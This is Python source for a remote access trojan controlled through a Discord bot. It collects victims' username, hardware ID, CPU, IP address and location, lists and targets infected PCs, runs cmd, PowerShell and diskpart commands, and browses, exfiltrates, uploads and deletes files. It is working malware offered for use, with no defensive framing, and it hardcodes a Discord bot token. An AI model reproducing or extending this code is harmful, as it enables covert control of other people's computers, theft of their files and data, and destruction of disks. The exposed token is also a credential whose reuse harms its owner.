import discord
from discord.ext import commands
import ctypes
import util
import cmdrat

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

token = "MTQyMDE4MjcwNDkwOTA2MjI4Ng.Gknq6h.WiwtYSbLV7RYAEATfk5qTiu8yat-NUccK1ISmU"

async def start(ctx):
    await ctx.channel.send(f'Logged in as {bot.user}')
    await ctx.channel.send('--------------------------')
    await ctx.channel.send(f"Admin: {util.is_user_admin()}")
    await ctx.channel.send(f"Username: {util.get_user_name()}")
    await ctx.channel.send(f"HWID: {util.get_hwid()}")
    await ctx.channel.send(f"CPU Name: {util.get_cpu_name()}")
    await ctx.channel.send(f"CPU ID: {util.get_cpu_id()}")
    await ctx.channel.send(f"IPv4: {util.get_IPV4()}")
    await ctx.channel.send(f"Location: {util.get_location()}")
    await ctx.channel.send('--------------------------')

@bot.event
async def on_ready():
    print(f'Bot logged in as {bot.user}')

@bot.command()
async def getpcs(ctx):
    import device_manager
    pc_info = device_manager.get_pc_info()
    await ctx.send(f"```\n🖥️ {pc_info}\n```")

@bot.command()
async def target(ctx, *, target_name):
    user_id = ctx.author.id
    import device_manager
    
    if not device_manager.should_execute(user_id):
        return
    
    result = device_manager.set_target(user_id, target_name)
    await ctx.send(f"```css\n{result}\n```")

@bot.command()
async def cleartarget(ctx):
    user_id = ctx.author.id
    import device_manager
    
    result = device_manager.clear_target(user_id)
    await ctx.send(f"```css\n{result}\n```")

@bot.command()
async def targets(ctx):
    import device_manager
    
    if not device_manager.should_execute(ctx.author.id):
        return
    
    result = device_manager.get_all_targets()
    await ctx.send(f"```\n{result}\n```")

@bot.command()
async def sysinfo(ctx):
    import device_manager
    user_id = ctx.author.id
    
    if not device_manager.should_execute(user_id):
        return
        
    await start(ctx)

@bot.command()
async def info(ctx):
    await start(ctx)

@bot.command()
async def cmds(ctx, section=None):
    if section is None:
        embed = discord.Embed(title="📋 Command Help", color=0x00ff00)
        embed.add_field(
            name="🔧 General Commands",
            value="`!sysinfo` - Show system information\n`!cmds <section>` - Show detailed help\n`!getpcs` - Show all connected PCs\n`!target <pc>` - Target specific PC\n`!cleartarget` - Clear target (all PCs)",
            inline=False
        )
        embed.add_field(
            name="💻 Shell Commands",
            value="Use `!cmds shell` for shell command details",
            inline=False
        )
        embed.add_field(
            name="📁 File Explorer",
            value="Use `!cmds files` for file explorer details",
            inline=False
        )
        embed.set_footer(text="Use !cmds <section> for more details")
        await ctx.send(embed=embed)
    
    elif section.lower() in ['shell', 'cmd', 'terminal']:
        embed = discord.Embed(title="💻 Shell Commands", color=0xff0000)
        embed.add_field(
            name="Available Shells",
            value="`!cmd <command>` - Windows Command Prompt\n`!powershell <command>` - PowerShell\n`!diskpart <command>` - Disk Partition utility",
            inline=False
        )
        embed.add_field(
            name="Interactive Mode",
            value="After running a shell command, type commands without `!` to continue the session\nExample: `!cmd dir` then type `cd Documents`",
            inline=False
        )
        embed.add_field(
            name="Exit Shell",
            value="`!exit` - End current shell session",
            inline=False
        )
        embed.set_footer(text="Commands appear in red, output in green")
        await ctx.send(embed=embed)
    
    elif section.lower() in ['files', 'file', 'explorer', 'fexplr']:
        embed = discord.Embed(title="📁 File Explorer Commands", color=0x0099ff)
        embed.add_field(
            name="Navigation",
            value="`!fexplr` - Show current directory\n`!cd <folder>` - Navigate to folder\n`!cd ..` - Go up one directory\n`!goto <path>` - Jump to specific path\n`!pwd` - Show current path",
            inline=False
        )
        embed.add_field(
            name="File Operations",
            value="`!download <filename>` - Upload file to download services\n`!upload` - Upload Discord attachment to current folder\n`!delete <filename>` - Delete file or folder\n`!search <term>` - Search for files\n`!mkdir <folder>` - Create new folder",
            inline=False
        )
        embed.add_field(
            name="Pagination",
            value="`!page <number>` - View specific page of files\nShows 25 items per page automatically",
            inline=False
        )
        embed.add_field(
            name="Examples",
            value="`!fexplr` → `!cd Desktop` → `!download file.txt`\n`!goto C:\\Users` → `!search .py`",
            inline=False
        )
        await ctx.send(embed=embed)
    
    else:
        await ctx.send("❌ Unknown help section. Use `!cmds` to see available sections.")

@bot.command()
async def diskpart(ctx, *, command):
    user_id = ctx.author.id
    await ctx.send(f"```diff\n- {command}\n```")
    result = cmdrat.start_shell(user_id, "diskpart", command)
    await ctx.send(f"```css\n{result}\n```")

@bot.command()
async def powershell(ctx, *, command):
    user_id = ctx.author.id
    await ctx.send(f"```diff\n- {command}\n```")
    result = cmdrat.start_shell(user_id, "powershell", command)
    await ctx.send(f"```css\n{result}\n```")

@bot.command()
async def cmd(ctx, *, command):
    user_id = ctx.author.id
    await ctx.send(f"```diff\n- {command}\n```")
    result = cmdrat.start_shell(user_id, "cmd", command)
    await ctx.send(f"```css\n{result}\n```")

@bot.command()
async def fexplr(ctx):
    user_id = ctx.author.id
    import file_explr
    result = file_explr.get_file_tree(file_explr.get_current_path(user_id), 1)
    await ctx.send(f"```\n{result}\n```")

@bot.command()
async def page(ctx, page_number: int):
    user_id = ctx.author.id
    import file_explr
    result = file_explr.get_page(user_id, page_number)
    await ctx.send(f"```\n{result}\n```")

@bot.command()
async def cd(ctx, *, folder_name):
    user_id = ctx.author.id
    import file_explr
    result = file_explr.navigate_to(user_id, folder_name)
    await ctx.send(f"```\n{result}\n```")

@bot.command()
async def download(ctx, *, filename):
    user_id = ctx.author.id
    import file_explr
    await ctx.send("```diff\n- Uploading file...\n```")
    result = file_explr.download_file(user_id, filename)
    await ctx.send(f"```css\n{result}\n```")

@bot.command()
async def upload(ctx):
    user_id = ctx.author.id
    import file_explr
    
    if not ctx.message.attachments:
        await ctx.send("❌ No file attached. Please attach a file to upload.")
        return
    
    results = []
    for attachment in ctx.message.attachments:
        await ctx.send(f"```diff\n- Uploading {attachment.filename}...\n```")
        result = file_explr.upload_attachment(user_id, attachment.url, attachment.filename)
        results.append(result)
    
    await ctx.send(f"```css\n{chr(10).join(results)}\n```")

@bot.command()
async def delete(ctx, *, filename):
    user_id = ctx.author.id
    import file_explr
    await ctx.send(f"```diff\n- Deleting {filename}...\n```")
    result = file_explr.delete_file(user_id, filename)
    await ctx.send(f"```css\n{result}\n```")

@bot.command()
async def mkdir(ctx, *, folder_name):
    user_id = ctx.author.id
    import file_explr
    result = file_explr.create_folder(user_id, folder_name)
    await ctx.send(f"```css\n{result}\n```")

@bot.command()
async def search(ctx, *, search_term):
    user_id = ctx.author.id
    import file_explr
    result = file_explr.search_files(user_id, search_term)
    await ctx.send(f"```css\n{result}\n```")

@bot.command()
async def pwd(ctx):
    user_id = ctx.author.id
    import file_explr
    current_path = file_explr.get_current_path(user_id)
    await ctx.send(f"```\n📂 Current path: {current_path}\n```")

@bot.command()
async def goto(ctx, *, path):
    user_id = ctx.author.id
    import file_explr
    result = file_explr.set_path(user_id, path)
    await ctx.send(f"```\n{result}\n```")

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    user_id = message.author.id
    
    if message.content == '!exit':
        if cmdrat.has_active_shell(user_id):
            result = cmdrat.end_shell(user_id)
            await message.channel.send(result)
        return
    
    if cmdrat.has_active_shell(user_id) and not message.content.startswith('!'):
        await message.channel.send(f"```diff\n- {message.content}\n```")
        result = cmdrat.send_command(user_id, message.content)
        await message.channel.send(f"```css\n{result}\n```")
    
    await bot.process_commands(message)

if token == "":
    print("Please add your Discord bot token")
else:
    bot.run(token)